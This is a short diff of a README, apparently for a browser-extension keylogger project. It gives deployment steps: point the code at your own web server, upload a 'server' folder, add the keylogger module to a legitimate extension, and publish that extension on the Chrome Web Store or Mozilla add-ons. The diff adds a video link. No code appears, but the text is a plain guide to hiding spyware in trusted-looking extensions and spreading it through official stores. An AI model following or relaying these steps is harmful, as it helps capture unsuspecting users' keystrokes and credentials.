@@ -25,9 +25,10 @@ https://www.youtube.com/watch?v=UDCbjAC1eCE
 
 change http://1127.0.0.1     to your web server 
 
-2) send folder named "server"   to your web server , test with wampserver or xhampp
+2) send folder named " server "   to your web server , test with wampserver or xhampp ......etc
 
 3) take a legitimate extension then add your keylogger module, if you have questions how does it work ask me in comment
+  or you can see this video https://www.youtube.com/watch?v=CC4Ba3LxqCc&t=384s
 
 4) publish your extension one chrome web store or adon mozilla
 
